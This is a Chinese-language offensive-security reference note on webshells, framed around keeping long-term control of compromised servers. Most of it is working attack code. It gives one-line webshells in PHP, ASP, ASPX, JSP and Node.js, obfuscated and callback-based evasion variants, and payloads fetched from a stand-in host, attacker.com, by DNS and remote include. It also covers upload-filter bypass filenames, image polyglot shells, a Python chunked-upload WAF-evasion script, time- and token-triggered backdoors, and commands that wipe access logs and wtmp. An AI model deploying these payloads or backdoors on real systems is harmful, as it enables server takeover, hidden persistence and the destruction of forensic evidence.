# Webshell — Webshell 形态、免杀与 WAF 绕过

> Webshell 是 Web 应用环境下最通用的代码执行载体。从一句话木马到功能齐全的文件管理器，从裸奔 eval 到多层加密免杀——掌握 Webshell 技术是在受限环境中长期维持控制的基础。

## 关键词

`webshell` `一句话` `大马` `免杀` `WAF绕过` `eval` `assert` `preg_replace` `create_function` `无文件webshell` `内存马` `图片马` `polyglot` `.htaccess` `php_value` `base64编码` `加密webshell` `callback` `variable function` `冰蝎` `哥斯拉`

---

## 1. 一句话 Webshell 形态

### 1.1 PHP 一句话全集

```php
<?php
// ====== 基础 eval 系 ======
<?php @eval($_POST['cmd']); ?>
<?php @eval($_GET['c']); ?>
<?php @eval($_REQUEST['x']); ?>

// ====== assert（PHP < 7.2） ======
<?php @assert($_POST['cmd']); ?>
// assert 可直接执行字符串，参数不需要分号

// ====== system / exec / shell_exec / passthru ======
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
<?php echo `$_GET[c]`; ?>

// ====== preg_replace /e (PHP < 7.0) ======
<?php @preg_replace('/.*/e', $_POST['cmd'], ''); ?>

// ====== create_function (PHP < 7.2) ======
<?php $f = create_function('', $_POST['cmd']); $f(); ?>

// ====== call_user_func / call_user_func_array ======
<?php call_user_func('system', $_GET['c']); ?>
<?php call_user_func_array('assert', array($_POST['cmd'])); ?>

// ====== 变量函数 (Variable Functions) ======
<?php
$a = 'system';
$b = $_GET['c'];
$a($b);  // system($_GET['c'])
?>

// ====== 动态方法调用 ======
<?php
$c = new ReflectionFunction('system');
$c->invoke($_GET['cmd']);
?>
```

### 1.2 ASP / ASPX

```asp
<!-- ASP 经典一句话 -->
<%eval request("cmd")%>
<%execute request("cmd")%>
<%executeGlobal request("cmd")%>

<!-- ASPX (C#) -->
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>

<!-- ASPX with full output -->
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.Process(){
    StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){
        RedirectStandardOutput=true, UseShellExecute=false, CreateNoWindow=true
    }
}.Start().StandardOutput.ReadToEnd()); %>
```

### 1.3 JSP

```jsp
<%
  if(request.getParameter("c") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("c"));
    java.io.InputStream in = p.getInputStream();
    int a; while((a = in.read()) != -1) out.write((char)a);
  }
%>

<!-- JSP 一句话 (EL 表达式) -->
${Runtime.getRuntime().exec(request.getParameter("c"))}
```

### 1.4 Node.js

```javascript
// Express 中间件注入
app.get('/shell', (req, res) => {
  require('child_process').exec(req.query.c, (e, out) => res.send(out));
});

// 极简一句话
require('child_process').exec(process.env.CMD);
```

---

## 2. 免杀技术

### 2.1 字符串变形（逃逸静态特征）

```php
<?php
// ====== 变量拼接 ======
$a = 's'.'y'.'s'.'t'.'e'.'m';
$b = $_POST['c'];
$a($b);

// ====== 编码 + 解码 ======
$c = base64_decode($_POST['c']);
eval($c);  // POST: c=ZWNobyAidGVzdCI7  (echo "test";base64)

// ====== XOR / ROT13 ======
$k = $_POST['k']; $c = $_POST['c'];
for($i=0;$i<strlen($c);$i++) $c[$i] = $c[$i] ^ $k[$i%strlen($k)];
eval($c);  // 加密后的 eval code，key 通过 POST 传入

// ====== ASCII 数组拼接 ======
// chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) = "system"
$a = array(115,121,115,116,101,109);
$f = ''; foreach($a as $v) $f .= chr($v);
$f($_POST['c']);

// ====== 字符串反转 ======
// strrev("metsys") = "system"
$a = strrev('metsys');
$a($_POST['c']);

// ====== 压缩 + 解压 ======
eval(gzinflate(base64_decode('S0tNTC7Jz8/ISVVILEotBgA=')));
// gzinflate + base64 双重编码

// ====== DNS 查询取回 payload ======
$h = gethostbyname('cmd.attacker.com');
// 用 DNS TXT 记录下发 payload
eval(dns_get_record('cmd.attacker.com', DNS_TXT)[0]['txt']);
```

### 2.2 回调函数绕过

```php
<?php
// 用不常见的 callback 函数执行代码
array_map('assert', array($_POST['cmd']));
array_filter([$_POST['cmd']], 'assert');
array_walk([$_POST['cmd']], 'assert');
preg_filter('/.*/e', $_POST['cmd'], '');  // PHP < 7
register_shutdown_function('system', $_POST['cmd']);
register_tick_function('system', $_POST['cmd']);
forward_static_call_array('assert', [$_POST['cmd']]);

// 用 usort/uksort 触发
usort(...$_POST['cmd']);  // 危险: 用户完全控制 usort 参数
```

### 2.3 无函数名调用

```php
<?php
// PHP 7+ FFI 绕过函数检测
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system($_GET['cmd']);

// 用 Reflection 绕
$f = new ReflectionFunction('s'.'y'.'s'.'t'.'e'.'m');
$f->invoke($_POST['c']);
```

### 2.4 内存马（无文件落地）

```php
<?php
// ====== 方法 1: 动态修改 .htaccess → 注入 php_value ======
// 如果无 .htaccess 但同级目录可写
file_put_contents('.htaccess',
  "php_value auto_prepend_file php://input\n" .
  "AddType application/x-httpd-php .png"
);

// ====== 方法 2: 注入 PHP-FPM (FastCGI) ======
// 利用 Gopher/SSRF 打 PHP-FPM unix socket
// gopher://127.0.0.1:9000/_%01%01%00%01...
// → 设置 PHP_VALUE: auto_prepend_file = php://input
// → POST body 即为 PHP 代码

// ====== 方法 3: session 反序列化内存马 ======
// 如果 session 存储使用反序列化处理器
// 构造恶意 session 值 → 下次请求自动触发
```

---

## 3. WAF 上传绕过

### 3.1 Content-Type 绕过

```python
# 标准白名单 MIME
"image/jpeg"
"image/png"
"image/gif"
"text/plain"
"application/octet-stream"

# 变体（某些 WAF 宽松匹配）
"image/jpeg;charset=utf-8"
"image/jpeg\x00.php"            # null byte
"image/jpeg%00.php"
"Image/JPEG"                     # 大小写

# 畸形 Content-Type
"multipart/form-data; boundary=something"
"application/x-www-form-urlencoded"
""
```

### 3.2 文件名绕过

```python
# ====== 解析差异绕过 ======
# Apache: 从右向左找能处理的扩展名
"shell.php.jpg"       → PHP
"shell.php.xxx"       → PHP（无 .xxx handler 时退回到 .php）
"shell.php%00.jpg"    → PHP（null byte 截断，PHP < 5.3）
"shell.pHp"           → PHP（大小写）
"shell.php\n.jpg"     → PHP（换行截断某些解析器）

# IIS 6: 分号后的截断
"shell.asp;.jpg"      → ASP

# Nginx + PHP-FPM: path_info 截断
"shell.jpg/1.php"     → PHP（如果 cgi.fix_pathinfo=1）
"shell.jpg%00.php"    → PHP

# ====== 特殊扩展名 ======
# PHP
"shell.phtml" "shell.pht" "shell.php5" "shell.php7" "shell.php8"
"shell.phar" "shell.shtml" "shell.inc" "shell.phps" "shell.pHP7"

# ASP/ASPX
"shell.cer" "shell.asa" "shell.asmx" "shell.ashx"
"shell.soap" "shell.cshtml" "shell.vbhtml"

# JSP
"shell.jspx" "shell.jspf" "shell.jsw" "shell.jsf"
```

### 3.3 文件内容绕过

```php
<?php
// ====== 图片马 PNG ======
// 前 8 字节: 89 50 4E 47 0D 0A 1A 0A (PNG magic)
// 在 IDAT chunk 后追加:
<?php system($_GET['c']); ?>
// 或利用 EXIF / tEXt / zTXt chunk

// ====== 图片马 JPEG ======
// EXIF 注入: exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg

// ====== 图片马 GIF ======
// GIF89a 头 + PHP 代码
/*
GIF89a<?php system($_GET['c']); ?>
*/

// ====== PDF 马 ======
%PDF-1.4
...
<?php system($_GET['c']); ?>

// ====== ZIP 马 ======
// 有效 zip + PHP 尾巴
// PK\x03\x04...<?php system($_GET['c']); ?>
```

### 3.4 分块上传绕过

```python
# 某些 WAF 对每个 chunk 独立检测
import requests

def chunked_upload(url, php_code):
    """分块传输 webshell，每个 chunk 在检测阈值以下"""
    body = (
        f"--BOUNDARY\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.phtml\"\r\n"
        f"Content-Type: image/jpeg\r\n\r\n"
    )
    # 将 PHP 代码分块
    chunks = [php_code[i:i+3] for i in range(0, len(php_code), 3)]
    for c in chunks:
        body += c
    body += "\r\n--BOUNDARY--\r\n"

    requests.post(url, data=body,
        headers={"Content-Type": "multipart/form-data; boundary=BOUNDARY"})
```

---

## 4. 高级免杀策略

### 4.1 冰蝎/哥斯拉原理

```
通信模型:
┌──────────┐    AES/RSA 加密 payload    ┌──────────┐
│ 客户端    │ ←───────────────────────→ │ Webshell │
│ (Behinder)│   base64 编码后隐藏在 POST │ (服务端)  │
└──────────┘   Content-Type: text/plain  └──────────┘

特征: 服务端代码无 eval/system 字样, 用 openssl_decrypt + call_user_func
```

### 4.2 无 eval 的一句话

```php
<?php
// 用 include 执行临时文件
file_put_contents('/tmp/s', '<?php '.$_POST['c'].';');
include '/tmp/s';

// 用 ini_set + 远程 include (需 allow_url_include)
ini_set('allow_url_include', '1');
include 'http://attacker.com/shell.txt';

// 用 extract 解包 + assert
extract($_POST); @$a($b);  // POST: a=system&b=whoami

// 用 parse_str 同原理
parse_str($_POST['x']); @$a($b);  // POST: x=a=system&b=whoami
```

### 4.3 条件触发

```php
<?php
// 仅在特定条件下激活，日常为正常文件
if(md5($_GET['token']) === 'e10adc3949ba59abbe56e057f20f883e') {
    // token=123456 → md5 = 特定值 → 激活
    eval($_POST['c']);
}

// User-Agent 触发
if(strpos($_SERVER['HTTP_USER_AGENT'], 'SpecialAgent') !== false) {
    system($_POST['c']);
}

// Referer 触发
if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) === 'attacker.com') {
    system($_POST['c']);
}

// 时间触发（某日之后才激活）
if(time() > strtotime('2026-06-01')) {
    eval(file_get_contents('php://input'));
}
```

---

## 5. WebShell 交互工具速查

| 工具 | 语言 | 特点 |
|------|------|------|
| 中国蚁剑 (AntSword) | PHP/ASP/JSP | 开源,插件丰富,编码器自定义 |
| 冰蝎 (Behinder) | PHP/ASP/JSP | AES 加密通信,动态密钥 |
| 哥斯拉 (Godzilla) | PHP/ASP/JSP | 高自定义,多加密器 |
| Weevely3 | PHP | Python 生成,30+模块,SSH/db/代理 |
| webacoo | PHP | 混淆 payload,隐蔽 |
| Cknife | PHP | 类菜刀,闭源 |

---

## 6. Webshell 检测对抗

### 6.1 流量隐藏

```bash
# 将 payload-base64 隐藏在正常参数中
POST /index.php HTTP/1.1
Cookie: PHPSESSID=<?php system($_GET['c'])?>;  # session 值注入

# 隐藏在 JWT token / Authorization header
Authorization: Bearer <?php eval($_POST['c']); ?>
```

### 6.2 日志清理

```bash
# 拿到 shell 后清理访问痕迹
sed -i '/shell\.php/d' /var/log/apache2/access.log
sed -i '/POST.*cmd/d' /var/log/nginx/access.log

# 覆盖 last 登录日志
echo > /var/log/wtmp

# PHP 自己的日志
ini_set('error_log', '/dev/null');
```

---

## 7. 关联技术

- [[01-command-injection]] — 命令注入
- [[03-php-disable-functions-bypass]] — PHP 函数禁用绕过
- [[04-reverse-shell-bind]] — 反弹 shell
- [[05-chain-playbook]] — 漏洞→Shell 链
- [[file-upload-xxe-lfi]] — 文件上传 / LFI
- [[01-sqli-fundamentals]] — SQL 注入 INTO OUTFILE 写马
